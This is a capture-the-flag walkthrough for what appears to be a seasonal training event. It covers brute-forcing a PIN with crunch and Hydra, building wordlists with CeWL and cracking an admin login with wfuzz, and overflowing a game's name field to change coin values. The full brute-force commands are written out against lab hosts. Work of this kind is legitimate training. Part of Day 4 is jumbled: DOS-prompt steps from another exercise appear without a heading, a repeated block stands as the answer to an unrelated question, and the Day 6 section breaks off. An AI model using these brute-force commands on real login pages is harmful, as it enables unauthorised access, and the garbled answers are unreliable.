## Day 3 - Hydra is Coming to Town
> Initially, I was using Hydra v9.3 and the POST requests weren't being sent out properly. Updating to v9.5.1 fixed that.

**Q1: Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?**

Generate the wordlist with crunch.
```
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

Launch Hydra with the wordlist as our password list.
```
hydra -l '' -P 3digits.txt -f -v <IP ADDRESS> http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

Navigate to http://IP-ADDRESS:8000/pin.php and put in the PIN. Click `Unlock Door` to get the flag.

<br>

## Day 4 - Baby, it's CeWLd outside

**Q1: What is the correct username and password combination? Format username:password**

Generate the username and password lists.
```
cewl -d 0 -m 5 -w usernames.txt http://<IP>/team.php --lowercase
cewl -d 2 -m 5 -w passwords.txt http://<IP> --with-numbers
```

Navigate to the admin portal and attempt to login with any username and password.

Notice the error message: `Please enter the correct credentials`.

Use wfuzz to bruteforce logins.
- Incorrect login attempts will not be displayed

```
wfuzz -c -H "Content-Type: application/x-www-form-urlencoded" -w usernames.txt -w passwords.txt -d "username=FUZZ&password=FUZ2Z" -X POST --hs "Please enter the correct credentials" -u "http://<IP>/login.php"
```

The correct username/password combination will show up in the output.

From the DOS prompt, navigate to the **C:\** directory and run the `edit plan.txt` command to see the program's name.

Afterwards, press the following keys to exit and return to the DOS prompt:

```
ALT
f
x
n
```

**Q3: What should the correct bytes be in the backup's file signature to restore the backup properly?**

From the DOS prompt, navigate to the **C:\** directory and run the `edit plan.txt` command to see the program's name.

Afterwards, press the following keys to exit and return to the DOS prompt:

```
ALT
f
x
n
```

**Q4: What is the flag after restoring the backup successfully?**

From Q3, we know the bytes are `41 43`. However, they need to be converted to ASCI, which is `AC`.

From the DOS prompt, navigate to the **C:\** directory and run the `edit AC2023.BAK` command.

Replace `XX` with `AC`. Press the following keys to save and edit:
```
ALT
f
x
y
```

Navigate to the **C:\TOOLS\BACKUP** directory and run the `bumaster.exe C:\AC2023.BAK` command to get the flag.

<br>

## Day 6 - Memories of Christmas Past 

**Q1: If the coins variable had the in-memory value in the image below, how many coins would you have in the game?**

Read from left to right, the values are `4f4f5053`. However, they are stored ordered in little endian, and should be read from right to left: `53504f4f`.

Plug these into a hex to decimal converter to get the value.

**Q2: What is the value of the final flag?**

Go to the computer and hit `<space bar>` until you get 15 coins.

Speak to Van Holly to change names. When prompted, provide (15) `a` for the name.

You will now have `6447714` coins.

However, any attempts to purchase a star fail; we end up with another item.

Speak to Van Holly again and put in the following characters without any newlines or spaces:
- (12) aaaaaaaaaaaa
- (4) bbbb
- (12) cccccccccccc
- (16) eeeeeeeeeeeeeeee
- (1) d
